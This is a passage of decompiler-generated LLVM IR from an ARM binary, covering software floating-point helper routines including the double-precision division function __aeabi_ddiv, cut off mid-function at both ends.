  store i32 %v6_167b4, i32* %r4.global-to-local, align 4
  %v3_167b8 = icmp ugt i32 %v1_167ac, 768
  br i1 %v3_167b8, label %dec_label_pc_167c8, label %dec_label_pc_167bc

dec_label_pc_167bc:                               ; preds = %bb42
  %v1_167bc = icmp slt i32 %v0_167bc, 0
  %v2_167bc = mul i32 %v0_167bc, 2
  store i32 %v2_167bc, i32* %lr.global-to-local, align 4
  %v3_167c0 = mul i32 %v14_167a0, 2
  %v4_167c0 = zext i1 %v1_167bc to i32
  %v5_167c0 = or i32 %v4_167c0, %v3_167c0
  %v9_167c0 = icmp ule i32 %v5_167c0, %v14_167a0
  %v10_167c0 = icmp ult i32 %v3_167c0, %v14_167a0
  %v11_167c0 = select i1 %v1_167bc, i1 %v9_167c0, i1 %v10_167c0
  %v3_167c425 = mul nuw nsw i64 %v12_167a0, 2
  %v3_167c4 = trunc i64 %v3_167c425 to i32
  %v4_167c4 = zext i1 %v11_167c0 to i32
  %v5_167c4 = or i32 %v4_167c4, %v3_167c4
  br label %dec_label_pc_167c8

dec_label_pc_167c8:                               ; preds = %bb42, %dec_label_pc_167bc
  %v0_167d8 = phi i32 [ %v0_167bc, %bb42 ], [ %v2_167bc, %dec_label_pc_167bc ]
  %v0_167d0 = phi i32 [ %v14_167a0, %bb42 ], [ %v5_167c0, %dec_label_pc_167bc ]
  %v1_167c8 = phi i32 [ %v13_167a0, %bb42 ], [ %v5_167c4, %dec_label_pc_167bc ]
  %v4_167c8 = mul i32 %v1_167c8, 2048
  %v4_167cc = udiv i32 %v0_167d0, 2097152
  %v5_167c8 = or i32 %v4_167cc, %v1_16794
  %v5_167cc = or i32 %v5_167c8, %v4_167c8
  store i32 %v5_167cc, i32* %r1.global-to-local, align 4
  %v3_167d0 = mul i32 %v0_167d0, 2048
  %v4_167d4 = udiv i32 %v0_167d8, 2097152
  %v5_167d4 = or i32 %v3_167d0, %v4_167d4
  store i32 %v5_167d4, i32* %r0.global-to-local, align 4
  %v3_167d8 = mul i32 %v0_167d8, 2048
  store i32 %v3_167d8, i32* %lr.global-to-local, align 4
  %v1_167dc = add i32 %v6_167b4, -253
  store i32 %v1_167dc, i32* %ip.global-to-local, align 4
  %v2_167dc = icmp ugt i32 %v6_167b4, 252
  %v7_167dc = icmp eq i32 %v6_167b4, 253
  %v2_167e0 = xor i1 %v7_167dc, true
  %v3_167e0 = and i1 %v2_167dc, %v2_167e0
  br i1 %v3_167e0, label %bb43, label %bb44

bb43:                                             ; preds = %dec_label_pc_167c8
  %v6_167e0 = icmp ugt i32 %v1_167dc, 1791
  %v11_167e0 = icmp eq i32 %v1_167dc, 1792
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_167c8, %bb43
  %v1_167e4 = phi i1 [ %v7_167dc, %dec_label_pc_167c8 ], [ %v11_167e0, %bb43 ]
  %v0_167e4 = phi i1 [ %v2_167dc, %dec_label_pc_167c8 ], [ %v6_167e0, %bb43 ]
  %v2_167e4 = xor i1 %v1_167e4, true
  %v3_167e4 = and i1 %v0_167e4, %v2_167e4
  call void @__pseudo_cond_branch(i1 %v3_167e4, i32 ptrtoint (i32* @global_var_16830.740 to i32))
  %v0_167e8 = load i32, i32* %lr.global-to-local, align 4
  %v2_167e8 = icmp slt i32 %v0_167e8, 0
  %v6_167e8 = icmp eq i32 %v0_167e8, -2147483648
  %v1_167ec = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_167e8, label %bb45, label %._crit_edge

bb45:                                             ; preds = %bb44
  %v2_167ec = urem i32 %v1_167ec, 2
  %v3_167ec = icmp ne i32 %v2_167ec, 0
  %v4_167ec = udiv i32 %v1_167ec, 2
  store i32 %v4_167ec, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb44, %bb45
  %v1_167f0 = phi i1 [ %v3_167ec, %bb45 ], [ %v2_167e8, %bb44 ]
  %v2_167f0 = zext i1 %v1_167f0 to i32
  %v3_167f0 = add i32 %v2_167f0, %v1_167ec
  store i32 %v3_167f0, i32* %r0.global-to-local, align 4
  %v0_167f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_167f4 = load i32, i32* %r4.global-to-local, align 4
  %v2_167f4 = and i32 %v1_167f4, 4096
  %v3_167f4 = icmp ne i32 %v2_167f4, 0
  %v4_167f4 = mul i32 %v1_167f4, 1048576
  %v6_167f4 = add i32 %v4_167f4, %v0_167f4
  %v7_167f4 = zext i1 %v3_167f4 to i32
  %v8_167f4 = add i32 %v7_167f4, %v6_167f4
  store i32 %v8_167f4, i32* %r1.global-to-local, align 4
  %v2_167f8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_167f8, i32* %r4.global-to-local, align 4
  store i32 %v12_16744, i32* %lr.global-to-local, align 4
  ret i32 %v3_167f0

dec_label_pc_16800:                               ; preds = %.thread3, %bb40
  %v1_1680c = phi i32 [ %v1_167807, %.thread3 ], [ %v1_16780, %bb40 ]
  %v1_16804 = phi i32 [ %v1_1677c5, %.thread3 ], [ %v1_1677c, %bb40 ]
  %v1_16800 = and i32 %v2_16768, -2147483648
  %v2_16804 = or i32 %v1_16804, %v1_16800
  %v4_168081 = or i64 %tmp, %arg1
  %v4_16808 = trunc i64 %v4_168081 to i32
  store i32 %v4_16808, i32* %r0.global-to-local, align 4
  %v2_1680c = xor i32 %v2_16804, %v1_1680c
  store i32 %v2_1680c, i32* %r1.global-to-local, align 4
  %v4_16810 = udiv i32 %v1_1676c, 2
  %v5_16810 = sub i32 %v2_16764, %v4_16810
  store i32 %v5_16810, i32* %r4.global-to-local, align 4
  %v7_16810 = sub i32 0, %v5_16810
  %v8_16810 = and i32 %v2_16764, %v7_16810
  %v11_16810 = icmp eq i32 %v2_16764, %v4_16810
  %v7_16814 = icmp sgt i32 %v2_16764, %v4_16810
  br i1 %v7_16814, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_16800
  %v10_16814 = sub i32 %v1_1676c, %v5_16810
  %v12_16814 = xor i32 %v5_16810, %v1_1676c
  %v13_16814 = xor i32 %v10_16814, %v1_1676c
  %v14_16814 = and i32 %v13_16814, %v12_16814
  %v17_16814 = icmp eq i32 %v1_1676c, %v5_16810
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_16800, %bb46
  %v3_16820.in = phi i32 [ %v8_16810, %dec_label_pc_16800 ], [ %v14_16814, %bb46 ]
  %v2_16820.in = phi i32 [ %v5_16810, %dec_label_pc_16800 ], [ %v10_16814, %bb46 ]
  %v1_16820 = phi i1 [ %v11_16810, %dec_label_pc_16800 ], [ %v17_16814, %bb46 ]
  %v2_16820 = icmp slt i32 %v2_16820.in, 0
  %v3_16820 = icmp slt i32 %v3_16820.in, 0
  %v3_16818 = xor i1 %v3_16820, %v2_16820
  %v4_16818 = or i1 %v1_16820, %v3_16818
  br i1 %v4_16818, label %._crit_edge23, label %bb48

._crit_edge23:                                    ; preds = %bb47
  %v0_16820.pre = load i32, i32* %lr.global-to-local, align 4
  br label %bb49

bb48:                                             ; preds = %bb47
  %v9_1681830 = mul i32 %v5_16810, 1048576
  %v10_1681831 = or i32 %v2_1680c, %v9_1681830
  store i32 %v10_1681831, i32* %r1.global-to-local, align 4
  %v7_1681c = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_1681c, i32* %r4.global-to-local, align 4
  store i32 %v12_16744, i32* %lr.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %._crit_edge23, %bb48
  %v0_16820 = phi i32 [ %v0_16820.pre, %._crit_edge23 ], [ %v12_16744, %bb48 ]
  %v6_16820 = xor i1 %v4_16818, true
  call void @__pseudo_cond_branch(i1 %v6_16820, i32 %v0_16820)
  %v0_16824 = load i32, i32* %r1.global-to-local, align 4
  %v1_16824 = or i32 %v0_16824, 1048576
  store i32 %v1_16824, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_1682c = load i32, i32* %r4.global-to-local, align 4
  %v1_1682c = add i32 %v0_1682c, -1
  store i32 %v1_1682c, i32* %r4.global-to-local, align 4
  ret i32 %v4_16808

; uselistorder directives
  uselistorder i32 %v5_16810, { 1, 0, 5, 3, 4, 2, 6 }
  uselistorder i32 %v4_16810, { 2, 1, 0 }
  uselistorder i32 %v1_167ec, { 2, 0, 1 }
  uselistorder i32 %v0_167e8, { 1, 0 }
  uselistorder i1 %v7_167dc, { 1, 0 }
  uselistorder i32 %v2_167bc, { 1, 0 }
  uselistorder i1 %v1_167bc, { 1, 0 }
  uselistorder i32 %v6_167b4, { 0, 2, 1, 3 }
  uselistorder i32 %v0_167bc, { 1, 0, 2 }
  uselistorder i32 %v14_167a0, { 1, 3, 2, 0 }
  uselistorder i64 %v11_167a0, { 1, 0 }
  uselistorder i64 %v12_16798, { 1, 0 }
  uselistorder i64 %v10_16798, { 1, 0 }
  uselistorder i64 %v7_16790, { 1, 0 }
  uselistorder i64 %v6_16788, { 1, 0 }
  uselistorder i32 %v6_16770, { 1, 0 }
  uselistorder i32 %v6_1676c, { 1, 0, 2 }
  uselistorder i32 %v1_1676c, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_16764, { 4, 3, 0, 2, 1, 5, 6 }
  uselistorder i32 %v6_16754, { 2, 1, 0 }
  uselistorder i32 %v5_16750, { 2, 1, 0 }
  uselistorder i32 %v12_16744, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 9, 10, 2, 3, 4, 5, 6, 8, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i32 %arg4, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_16800, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_167c8, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %.thread2, { 3, 2, 1, 0 }
}

define i32 @function_16830() local_unnamed_addr {
dec_label_pc_16830:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_16 = alloca i32, align 4
  %v0_16830 = load i1, i1* @cpsr_z, align 1
  %v1_16830 = load i1, i1* @cpsr_n, align 1
  %v2_16830 = load i1, i1* @cpsr_v, align 1
  %v3_16830 = xor i1 %v1_16830, %v2_16830
  %v4_16830 = or i1 %v0_16830, %v3_16830
  br i1 %v4_16830, label %dec_label_pc_16834, label %dec_label_pc_169ac

dec_label_pc_16834:                               ; preds = %dec_label_pc_16830
  %v0_16834 = load i32, i32* @r4, align 4
  %v4_16834 = add i32 %v0_16834, 54
  %v6_16834 = sub i32 0, %v0_16834
  %v7_16834 = and i32 %v4_16834, %v6_16834
  %v8_16834 = icmp slt i32 %v7_16834, 0
  %v9_16834 = icmp slt i32 %v4_16834, 0
  %v10_16834 = icmp eq i32 %v4_16834, 0
  %v7_16838 = icmp sgt i32 %v0_16834, -54
  br i1 %v7_16838, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_16834
  store i32 0, i32* @r0, align 4
  %v8_1683c = load i32, i32* @r1, align 4
  %v9_1683c = and i32 %v8_1683c, -2147483648
  store i32 %v9_1683c, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16834, %bb
  %v4_16844 = xor i1 %v9_16834, %v8_16834
  %v5_16844 = or i1 %v10_16834, %v4_16844
  call void @__pseudo_cond_branch(i1 %v5_16844, i32 %tmp7)
  %v0_16848 = load i32, i32* @r4, align 4
  %v1_16848 = sub i32 0, %v0_16848
  %v2_1684c = sub i32 -32, %v0_16848
  %v4_1684c = add i32 %v0_16848, 31
  %v5_1684c = and i32 %v4_1684c, %v1_16848
  %v6_1684c = icmp slt i32 %v5_1684c, 0
  store i1 %v6_1684c, i1* @cpsr_v, align 1
  %v6_16850 = icmp slt i32 %v1_16848, 32
  br i1 %v6_16850, label %dec_label_pc_16854, label %dec_label_pc_168c0

dec_label_pc_16854:                               ; preds = %.thread1
  %v1_16854 = add i32 %v2_1684c, 12
  %v8_16858 = icmp sgt i32 %v1_16854, 0
  br i1 %v8_16858, label %dec_label_pc_16890, label %dec_label_pc_1685c

dec_label_pc_1685c:                               ; preds = %dec_label_pc_16854
  %v1_1685c = add i32 %v2_1684c, 32
  %v1_16860 = sub i32 0, %v2_1684c
  %v0_16864 = load i32, i32* @r0, align 4
  %v6_16864 = shl i32 %v0_16864, %v1_16860
  %v2_16868 = add i32 %v2_1684c, 31
  %v3_16868 = shl i32 1, %v2_16868
  %v6_16868 = lshr i32 %v0_16864, %v1_1685c
  %v1_1686c = load i32, i32* @r1, align 4
  %v7_1686c = shl i32 %v1_1686c, %v1_16860
  %v8_1686c = or i32 %v7_1686c, %v6_16868
  %v1_16870 = and i32 %v1_1686c, -2147483648
  %tmp = bitcast i32 %v1_1686c to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_16874 = bitcast float %tmp19 to i32
  %tmp20 = icmp slt i32 %v6_16864, 0
  %v4_16878 = zext i1 %tmp20 to i32
  %v5_16878 = add i32 %v8_1686c, %v4_16878
  %v5_1687c = and i32 %v1_16874, %v3_16868
  %v6_1687c = icmp ne i32 %v5_1687c, 0
  %v7_1687c = lshr i32 %v1_16874, %v1_1685c
  %v9_1687c = add i32 %v7_1687c, %v1_16870
  %v10_1687c = zext i1 %v6_1687c to i32
  %v11_1687c = add i32 %v9_1687c, %v10_1687c
  store i32 %v11_1687c, i32* @r1, align 4
  %v19_1687c = add i32 %v11_1687c, %v10_1687c
  %v20_1687c = xor i32 %v19_1687c, %v1_1686c
  %v21_1687c = xor i32 %v19_1687c, %v7_1687c
  %v22_1687c = and i32 %v20_1687c, %v21_1687c
  %v23_1687c = icmp slt i32 %v22_1687c, 0
  store i1 %v23_1687c, i1* @cpsr_v, align 1
  %v3_16880 = mul i32 %v6_16864, 2
  %v4_16880 = or i32 %v3_16880, %tmp7
  %v5_16880 = icmp slt i32 %v4_16880, 0
  store i1 %v5_16880, i1* @cpsr_n, align 1
  %v6_16880 = icmp eq i32 %v4_16880, 0
  store i1 %v6_16880, i1* @cpsr_z, align 1
  br i1 %v6_16880, label %bb13, label %bb14

bb13:                                             ; preds = %dec_label_pc_1685c
  %tmp21 = sext i1 %tmp20 to i32
  %v6_16884 = add nsw i32 %tmp21, -1
  %v7_16884 = and i32 %v5_16878, %v6_16884
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_1685c, %bb13
  %v1_1688c = phi i32 [ %v5_16878, %dec_label_pc_1685c ], [ %v7_16884, %bb13 ]
  %v2_16888 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_16888, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1688c

dec_label_pc_16890:                               ; preds = %dec_label_pc_16854
  %v1_16890 = sub i32 0, %v2_1684c
  %v1_16894 = add i32 %v2_1684c, 32
  %v0_16898 = load i32, i32* @r0, align 4
  %v6_16898 = shl i32 %v0_16898, %v1_16890
  %v6_1689c = lshr i32 %v0_16898, %v1_16894
  %v1_168a0 = load i32, i32* @r1, align 4
  %v7_168a0 = shl i32 %v1_168a0, %v1_16890
  %v8_168a0 = or i32 %v7_168a0, %v6_1689c
  %v1_168a4 = and i32 %v1_168a0, -2147483648
  %tmp22 = icmp slt i32 %v6_16898, 0
  %v4_168a8 = zext i1 %tmp22 to i32
  %v5_168a8 = add i32 %v8_168a0, %v4_168a8
  %v6_168a8 = icmp ult i32 %v5_168a8, %v8_168a0
  %v2_168ac = zext i1 %v6_168a8 to i32
  %v3_168ac = or i32 %v2_168ac, %v1_168a4
  store i32 %v3_168ac, i32* @r1, align 4
  %v9_168ac = add nsw i32 %v3_168ac, %v2_168ac
  %v10_168ac = sub i32 0, %v1_168a0
  %v11_168ac = and i32 %v9_168ac, %v10_168ac
  %v12_168ac = icmp slt i32 %v11_168ac, 0
  store i1 %v12_168ac, i1* @cpsr_v, align 1
  %v3_168b0 = mul i32 %v6_16898, 2
  %v4_168b0 = or i32 %v3_168b0, %tmp7
  %v5_168b0 = icmp slt i32 %v4_168b0, 0
  store i1 %v5_168b0, i1* @cpsr_n, align 1
  %v6_168b0 = icmp eq i32 %v4_168b0, 0
  store i1 %v6_168b0, i1* @cpsr_z, align 1
  br i1 %v6_168b0, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_16890
  %tmp23 = sext i1 %tmp22 to i32
  %v6_168b4 = add nsw i32 %tmp23, -1
  %v7_168b4 = and i32 %v5_168a8, %v6_168b4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_16890, %bb15
  %v1_168bc = phi i32 [ %v5_168a8, %dec_label_pc_16890 ], [ %v7_168b4, %bb15 ]
  %v2_168b8 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_168b8, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_168bc

dec_label_pc_168c0:                               ; preds = %.thread1
  %v1_168c0 = sub i32 32, %v2_1684c
  %v1_168c4 = load i32, i32* @r0, align 4
  %v7_168c4 = shl i32 %v1_168c4, %v1_168c0
  %v8_168c4 = or i32 %v7_168c4, %tmp7
  %v6_168c8 = lshr i32 %v1_168c4, %v2_1684c
  %v1_168cc = load i32, i32* @r1, align 4
  %v7_168cc = shl i32 %v1_168cc, %v1_168c0
  %v8_168cc = or i32 %v7_168cc, %v6_168c8
  %v6_168d0 = lshr i32 %v1_168cc, %v2_1684c
  %v1_168d4 = and i32 %v1_168cc, -2147483648
  store i32 %v1_168d4, i32* @r1, align 4
  %v7_168d8 = lshr i32 %v1_168d4, %v2_1684c
  %v8_168d8 = sub i32 -1, %v7_168d8
  %v9_168d8 = and i32 %v6_168d0, %v8_168d8
  %tmp24 = icmp slt i32 %v8_168cc, 0
  %v4_168dc = zext i1 %tmp24 to i32
  %v5_168dc = add i32 %v4_168dc, %v9_168d8
  %v3_168e0 = mul i32 %v8_168cc, 2
  %v4_168e0 = or i32 %v8_168c4, %v3_168e0
  %v5_168e0 = icmp slt i32 %v4_168e0, 0
  store i1 %v5_168e0, i1* @cpsr_n, align 1
  %v6_168e0 = icmp eq i32 %v4_168e0, 0
  store i1 %v6_168e0, i1* @cpsr_z, align 1
  br i1 %v6_168e0, label %bb17, label %bb18

bb17:                                             ; preds = %dec_label_pc_168c0
  %tmp25 = sext i1 %tmp24 to i32
  %v6_168e4 = add nsw i32 %tmp25, -1
  %v7_168e4 = and i32 %v5_168dc, %v6_168e4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_168c0, %bb17
  %v1_168ec = phi i32 [ %v5_168dc, %dec_label_pc_168c0 ], [ %v7_168e4, %bb17 ]
  %v2_168e8 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_168e8, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_168ec

dec_label_pc_169ac:                               ; preds = %dec_label_pc_16830
  %v0_169ac = load i32, i32* @r1, align 4
  %v1_169ac = and i32 %v0_169ac, -2147483648
  %v1_169b4 = or i32 %v1_169ac, 2146435072
  store i32 %v1_169b4, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v5_168dc, { 1, 0 }
  uselistorder i32 %v5_168a8, { 1, 0, 2 }
  uselistorder i32 %v8_168a0, { 1, 0 }
  uselistorder i32 %v1_16890, { 1, 0 }
  uselistorder i32 %v5_16878, { 1, 0 }
  uselistorder i32 %v1_1686c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_16860, { 1, 0 }
  uselistorder i32 %v2_1684c, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_16848, { 1, 0 }
  uselistorder i32 %v4_16834, { 1, 2, 0 }
  uselistorder i32 %v0_16834, { 1, 0, 2 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32 %tmp5, { 2, 1, 0 }
  uselistorder i32 2146435072, { 1, 0 }
  uselistorder i32 -32, { 1, 0, 2, 4, 5, 6, 3, 7, 26, 27, 28, 29, 30, 31, 32, 8, 9, 33, 34, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 35, 21, 22, 23, 24, 25 }
  uselistorder i32 54, { 3, 0, 1, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_169c4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_169c4:
  %v1_169c8 = or i32 %arg1, 2146959360
  store i32 %v1_169c8, i32* @r1, align 4
  %v1_169d0 = load i32, i32* @r0, align 4
  ret i32 %v1_169d0
}

define i32 @__aeabi_ddiv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_169d4 = load i32, i32* @r4, align 4
  store i32 %v3_169d4, i32* %stack_var_-16, align 4
  %v6_169d4 = load i32, i32* @r5, align 4
  %v9_169d4 = load i32, i32* @r6, align 4
  %v12_169d4 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_169e0 = load i32, i32* @r1, align 4
  %v4_169e0 = udiv i32 %v1_169e0, 1048576
  %v5_169e0 = urem i32 %v4_169e0, 2048
  store i32 %v5_169e0, i32* @r4, align 4
  %v6_169e0 = icmp eq i32 %v5_169e0, 0
  br i1 %v6_169e0, label %entry..thread2_crit_edge, label %bb

entry..thread2_crit_edge:                         ; preds = %entry
  %.pre147 = udiv i32 %arg4, 1048576
  br label %.thread2

bb:                                               ; preds = %entry
  %v5_169e4 = udiv i32 %arg4, 1048576
  %v6_169e4 = urem i32 %v5_169e4, 2048
  store i32 %v6_169e4, i32* %r5.global-to-local, align 4
  %v7_169e4 = icmp eq i32 %v6_169e4, 0
  br i1 %v7_169e4, label %.thread1, label %bb90

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_16b70

bb90:                                             ; preds = %bb
  %v5_169e8 = icmp eq i32 %v5_169e0, 2047
  br i1 %v5_169e8, label %.thread2, label %bb91

.thread2:                                         ; preds = %entry..thread2_crit_edge, %bb90
  %.pre145.pre-phi = phi i32 [ %.pre147, %entry..thread2_crit_edge ], [ %v5_169e4, %bb90 ]
  br label %dec_label_pc_16b70

bb91:                                             ; preds = %bb90
  %v5_169ec = icmp eq i32 %v6_169e4, 2047
  br i1 %v5_169ec, label %dec_label_pc_16b70, label %dec_label_pc_169f4

dec_label_pc_169f4:                               ; preds = %bb91
  %v2_169f4 = sub nsw i32 %v5_169e0, %v6_169e4
  store i32 %v2_169f4, i32* %r4.global-to-local, align 4
  %v2_169f8 = xor i32 %v1_169e0, %arg4
  %v4_169fc = mul i32 %arg4, 4096
  %v5_169fc = or i32 %v4_169fc, %arg3
  store i32 %v5_169fc, i32* %r5.global-to-local, align 4
  %v7_169fc = icmp eq i32 %v5_169fc, 0
  %v3_16a00 = mul i32 %v1_169e0, 4096
  store i32 %v3_16a00, i32* %r1.global-to-local, align 4
  br i1 %v7_169fc, label %dec_label_pc_16b3c, label %dec_label_pc_16a08

dec_label_pc_16a08:                               ; preds = %dec_label_pc_169f4
  %tmp92 = mul i32 %arg4, 256
  %v4_16a10 = and i32 %tmp92, 268435200
  %v4_16a14 = udiv i32 %arg3, 16777216
  %v5_16a10 = or i32 %v4_16a14, %v4_16a10
  %v5_16a14 = or i32 %v5_16a10, 268435456
  store i32 %v5_16a14, i32* %r3.global-to-local, align 4
  %v3_16a18 = mul i32 %arg3, 256
  store i32 %v3_16a18, i32* %r2.global-to-local, align 4
  %tmp93 = mul i32 %v1_169e0, 256
  %v4_16a1c = and i32 %tmp93, 268435200
  %v1_16a20 = load i32, i32* @r0, align 4
  %v4_16a20 = udiv i32 %v1_16a20, 16777216
  %v5_16a1c = or i32 %v4_16a1c, %v4_16a20
  %v5_16a20 = or i32 %v5_16a1c, 268435456
  store i32 %v5_16a20, i32* %r5.global-to-local, align 4
  %v3_16a24 = mul i32 %v1_16a20, 256
  store i32 %v3_16a24, i32* %r6.global-to-local, align 4
  %v1_16a28 = and i32 %v2_169f8, -2147483648
  store i32 %v1_16a28, i32* %r1.global-to-local, align 4
  %v3_16a2c = icmp uge i32 %v5_16a20, %v5_16a14
  %v9_16a2c = icmp eq i32 %v5_16a20, %v5_16a14
  br i1 %v9_16a2c, label %bb94, label %bb95

bb94:                                             ; preds = %dec_label_pc_16a08
  %v4_16a30 = icmp uge i32 %v3_16a24, %v3_16a18
  br label %bb95

bb95:                                             ; preds = %dec_label_pc_16a08, %bb94
  %v1_16a34 = phi i1 [ %v3_16a2c, %dec_label_pc_16a08 ], [ %v4_16a30, %bb94 ]
  %v2_16a34 = add nsw i32 %v2_169f4, 253
  %v3_16a34 = zext i1 %v1_16a34 to i32
  %v4_16a34 = add nsw i32 %v2_16a34, %v3_16a34
  %v8_16a34 = icmp ule i32 %v4_16a34, %v2_169f4
  %v9_16a34 = icmp ugt i32 %v2_169f4, -254
  %v10_16a34 = select i1 %v1_16a34, i1 %v8_16a34, i1 %v9_16a34
  %v1_16a38 = add nsw i32 %v4_16a34, 768
  store i32 %v1_16a38, i32* %r4.global-to-local, align 4
  br i1 %v10_16a34, label %dec_label_pc_16a48, label %dec_label_pc_16a40

dec_label_pc_16a40:                               ; preds = %bb95
  %v3_16a40 = udiv i32 %v5_16a14, 2
  store i32 %v3_16a40, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16a48

dec_label_pc_16a48:                               ; preds = %bb95, %dec_label_pc_16a40
  %v0_16a50 = phi i32 [ %v5_16a14, %bb95 ], [ %v3_16a40, %dec_label_pc_16a40 ]
  %v0_16a54 = phi i32 [ %v3_16a18, %bb95 ], [ 0, %dec_label_pc_16a40 ]
  %v2_16a48 = sub i32 %v3_16a24, %v0_16a54
  store i32 %v2_16a48, i32* %r6.global-to-local, align 4
  %v3_16a48 = icmp uge i32 %v3_16a24, %v0_16a54
  %v3_16a4c = icmp eq i1 %v3_16a48, false
  %v4_16a4c = sub nsw i32 %v5_16a20, %v0_16a50
  %v6_16a4c = sext i1 %v3_16a4c to i32
  %v7_16a4c = add nsw i32 %v6_16a4c, %v4_16a4c
  store i32 %v7_16a4c, i32* %r5.global-to-local, align 4
  %v3_16a50 = udiv i32 %v0_16a50, 2
  store i32 %v3_16a50, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16a60.outer

dec_label_pc_16a60.outer:                         ; preds = %dec_label_pc_16af8, %dec_label_pc_16a48
  %v1_16b0c.ph = phi i32 [ %v2_16af8, %dec_label_pc_16af8 ], [ %v1_16a28, %dec_label_pc_16a48 ]
  %v0_16a64.ph = phi i32 [ %v5_16ad4, %dec_label_pc_16af8 ], [ %v7_16a4c, %dec_label_pc_16a48 ]
  %v1_16a68.ph = phi i32 [ %v3_16ad8, %dec_label_pc_16af8 ], [ %v2_16a48, %dec_label_pc_16a48 ]
  %v5_16ae017.ph = phi i32 [ %v5_16ae0, %dec_label_pc_16af8 ], [ %v3_16a50, %dec_label_pc_16a48 ]
  %v3_16ae413.ph = phi i32 [ %v3_16ae4, %dec_label_pc_16af8 ], [ 0, %dec_label_pc_16a48 ]
  %storemerge133 = phi i32 [ 0, %dec_label_pc_16af8 ], [ 1048576, %dec_label_pc_16a48 ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_16af8 ], [ 524288, %dec_label_pc_16a48 ]
  store i32 %storemerge133, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16a60

dec_label_pc_16a60:                               ; preds = %dec_label_pc_16a60.outer, %dec_label_pc_16ad0
  %v1_16ac459 = phi i32 [ %v2_16b0c, %dec_label_pc_16ad0 ], [ %storemerge133, %dec_label_pc_16a60.outer ]
  %v1_16a70 = phi i32 [ %v1_16a7032, %dec_label_pc_16ad0 ], [ %storemerge133, %dec_label_pc_16a60.outer ]
  %v1_16a8c41 = phi i32 [ %v1_16a8c43, %dec_label_pc_16ad0 ], [ %storemerge133, %dec_label_pc_16a60.outer ]
  %v1_16aa850 = phi i32 [ %v1_16aa852, %dec_label_pc_16ad0 ], [ %storemerge133, %dec_label_pc_16a60.outer ]
  %v0_16ae8 = phi i32 [ %v3_16ae8, %dec_label_pc_16ad0 ], [ %storemerge, %dec_label_pc_16a60.outer ]
